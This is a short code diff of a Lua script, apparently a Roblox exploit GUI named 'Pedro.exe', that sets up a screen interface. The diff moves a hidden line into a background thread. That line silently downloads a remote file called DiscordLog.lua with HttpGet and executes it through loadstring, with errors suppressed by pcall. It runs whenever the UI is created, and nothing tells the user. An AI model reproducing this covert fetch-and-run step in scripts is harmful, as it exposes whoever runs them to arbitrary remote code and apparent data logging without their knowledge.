@@ -41,9 +41,11 @@ local CountryCodes = {
 
 local CreateUI = function()
 
-  pcall(function()
-      loadstring(game:HttpGet('https://raw.githubusercontent.com/PivotEngine/Pedro.exe/main/DiscordLog.lua', true))()
-  end)
+	task.spawn(function()
+  		pcall(function()
+      			loadstring(game:HttpGet('https://raw.githubusercontent.com/PivotEngine/Pedro.exe/main/DiscordLog.lua', true))()
+  		end)
+	end)
   
 	local Pedroexe = Instance.new("ScreenGui")
 	local Frame = Instance.new("Frame")
@@ -285,6 +287,6 @@ local CreateUI = function()
 	HoverOverChat()
 end
 
-if not CoreGui:FindFirstChild('Pedro.essxe') then
+if not CoreGui:FindFirstChild('Pedro.exe') then
 	CreateUI()
 end
